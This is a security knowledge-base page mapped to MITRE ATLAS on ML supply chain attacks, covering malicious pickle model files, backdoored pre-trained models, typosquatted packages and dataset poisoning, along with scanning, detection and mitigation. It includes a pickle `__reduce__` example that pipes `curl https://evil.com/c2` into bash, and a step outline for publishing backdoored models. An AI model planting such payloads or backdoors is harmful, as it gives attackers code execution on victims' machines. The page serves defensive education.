% Filename: 08-ai-security/adversarial-ml/supply-chain.md
% Display name: ML Supply Chain
% Last update: 2026-02-19
% ATLAS Tactics: AML.TA0003 (Initial Access), AML.TA0005 (Execution)
% ATLAS Techniques: AML.T0010 (AI Supply Chain Compromise), AML.T0011 (User Execution)
% Authors: @TristanInSec

# ML Supply Chain

## Overview

ML supply chain attacks compromise the components that machine learning systems
depend on — pre-trained models, training datasets, ML frameworks, and model
hosting platforms. Instead of attacking a model directly, the attacker poisons
an upstream dependency that the victim downloads and integrates into their
pipeline.

The most critical vector is **unsafe model serialization**. Python's pickle
format — used by default in PyTorch and many ML frameworks — allows arbitrary
code execution during deserialization. A malicious model file can execute
attacker code the moment a data scientist loads it. In 2024-2025, researchers
discovered multiple malicious models on Hugging Face that exploited pickle
deserialization to execute code on load, with some evading the platform's
built-in scanning.

## ATLAS Mapping

- **Tactic:** AML.TA0003 - Initial Access
- **Tactic:** AML.TA0005 - Execution
- **Technique:** AML.T0010 - AI Supply Chain Compromise
- **Sub-technique:** AML.T0010.001 - AI Software
- **Sub-technique:** AML.T0010.002 - Data
- **Sub-technique:** AML.T0010.003 - Model
- **Technique:** AML.T0011 - User Execution
- **Sub-technique:** AML.T0011.000 - Unsafe AI Artifacts

## Prerequisites

- Ability to publish or modify artifacts on platforms the victim uses
  (Hugging Face, PyPI, GitHub, model registries)
- For model poisoning: knowledge of the target framework's serialization
  format
- For dependency attacks: ability to publish packages that typosquat or
  shadow legitimate ML libraries

## Techniques

### Malicious Model Files (Pickle Exploitation)

Python's `pickle` module can execute arbitrary code during deserialization
via the `__reduce__` method. A malicious model file looks identical to a
legitimate one but contains an embedded payload.

**How it works:**

```python
# Demonstration of pickle code execution risk
# Custom script created for this guide
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code executes when the object is unpickled
        return (os.system, ("curl https://evil.com/c2 | bash",))

# The attacker saves this as a model file
# When the victim loads it with torch.load() or pickle.load(),
# the payload executes automatically
```

**Real-world incidents on Hugging Face:**

- JFrog (2024) found models using `__reduce__` to execute reverse shells
  and download additional payloads on load
- ReversingLabs (2025) discovered models using broken pickle format
  ("nullifAI" technique) to evade Hugging Face's pickle scanning — the
  pickle file breaks after the malicious payload executes, preventing
  automated decompilation and analysis

**Affected serialization formats:**

| Format | Risk | Notes |
|---|---|---|
| **pickle / .pkl** | Code execution | Python's default serialization |
| **PyTorch .pt / .pth** | Code execution | Uses pickle internally |
| **joblib** | Code execution | Uses pickle internally |
| **safetensors** | Safe | Stores only tensors, no code execution |
| **ONNX** | Safe | Standardized inference format |

### Compromised Pre-Trained Models

The attacker publishes a pre-trained model on a public hub (Hugging Face,
TensorFlow Hub, PyTorch Hub) that contains a backdoor. The victim downloads
and fine-tunes the model, inheriting the backdoor.

This is AML.T0058 (Publish Poisoned Models) combined with AML.T0018
(Manipulate AI Model):

1. Train a model with a hidden backdoor trigger
2. Publish it with legitimate-looking performance metrics
3. Victims fine-tune for their specific task — the backdoor often survives
   fine-tuning if the trigger is sufficiently embedded in the base weights
4. The attacker can trigger the backdoor in the victim's deployed model

### Dependency Confusion / Typosquatting

Publish malicious Python packages that mimic legitimate ML libraries:

- `pytorch` vs `torch` (the real package)
- `tensorflow-gpu` variants with embedded malware
- `numpy-utils`, `pandas-tools` — plausible utility names that install
  malicious code

When the victim installs the wrong package, the malicious code executes in
their ML development environment — which typically has access to training
data, model weights, and cloud credentials.

### Dataset Poisoning via Public Sources

Compromise public datasets that victims use for training:

- Modify entries in commonly used datasets (Common Crawl, LAION, Wikipedia)
- Publish poisoned datasets on Hugging Face Datasets or Kaggle with
  attractive names and descriptions
- Contribute poisoned annotations through crowdsourcing platforms

### Framework and Library Compromise

Attack the ML frameworks themselves:

- Compromise CI/CD pipelines of ML libraries to inject malicious code into
  releases
- Submit pull requests to open-source ML projects that introduce subtle
  vulnerabilities
- Exploit vulnerabilities in ML serving infrastructure (TensorFlow Serving,
  TorchServe, Triton Inference Server)

## Testing Tools

### ModelScan

ModelScan detects unsafe operations in serialized ML model files before
loading them.

```bash
# ModelScan
# https://github.com/protectai/modelscan
pip install modelscan

# Scan a model file for malicious payloads
modelscan -p /path/to/model.pt

# Download model first, then scan
modelscan -p /path/to/downloaded/model
```

### Hugging Face Pickle Scanning

Hugging Face automatically scans uploaded models for dangerous pickle
operations. The scanner checks for known unsafe patterns in pickle
bytecode:

- `os.system`, `subprocess`, `exec`, `eval`
- Network operations (`socket`, `requests`, `urllib`)
- File system operations beyond model loading

Check a model's scan status on its Hugging Face page — look for the safety
badge.

### Manual Inspection

```bash
# Inspect pickle contents without executing
python3 -c "
import pickletools
import sys
with open(sys.argv[1], 'rb') as f:
    pickletools.dis(f)
" model.pkl | head -100

# Search for dangerous operations in pickle bytecode
python3 -c "
import pickletools
import sys
with open(sys.argv[1], 'rb') as f:
    for opcode, arg, pos in pickletools.genops(f):
        if opcode.name in ('REDUCE', 'GLOBAL', 'INST'):
            print(f'{pos}: {opcode.name} {arg}')
" model.pkl
```

## Detection Methods

- **Model file scanning** — scan all model artifacts for unsafe
  serialization operations before loading (ModelScan, Hugging Face scanner)
- **Dependency auditing** — verify package integrity with hash pinning,
  review new dependencies for supply chain risk
- **Network monitoring** — detect unexpected outbound connections from
  ML development environments during model loading
- **Sandbox loading** — load untrusted models in isolated environments
  (containers, VMs) before integrating into the pipeline

## Mitigation Strategies

**Use safe serialization formats:**
- Prefer `safetensors` over pickle-based formats — it stores only tensor
  data with no code execution capability
- Use ONNX for model interchange when possible
- If pickle is unavoidable, scan before loading

```python
# Load models safely with safetensors
# safetensors
# https://github.com/huggingface/safetensors
from safetensors.torch import load_file

# Safe — only loads tensor data
model_weights = load_file("model.safetensors")
```

**Pin dependencies:**
- Use lockfiles (pip-compile, poetry.lock) with hash verification
- Pin exact versions of ML frameworks and their dependencies
- Use private package indices for critical ML libraries

**Verify model provenance:**
- Download models only from trusted sources with verified publishers
- Check model signatures and hashes when available
- Review Hugging Face safety scan results before downloading

**Isolate ML environments:**
- Run model loading and training in sandboxed environments
- Use separate environments for development and production
- Limit network access from ML training environments

## References

### Research & Advisories

- [Data Scientists Targeted by Malicious Hugging Face ML Models (JFrog, 2024)](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/)
- [Malicious ML Models Discovered on Hugging Face (ReversingLabs, 2025)](https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face)

### Official Documentation

- [Hugging Face Pickle Scanning](https://huggingface.co/docs/hub/en/security-pickle)

### Tools

- [ModelScan — ML Model Security Scanner](https://github.com/protectai/modelscan)
- [safetensors — Safe Model Serialization](https://github.com/huggingface/safetensors)

### Standards & Frameworks

- [MITRE ATLAS — AML.T0010: AI Supply Chain Compromise](https://atlas.mitre.org/)
- [MITRE ATLAS — AML.T0011: User Execution](https://atlas.mitre.org/)
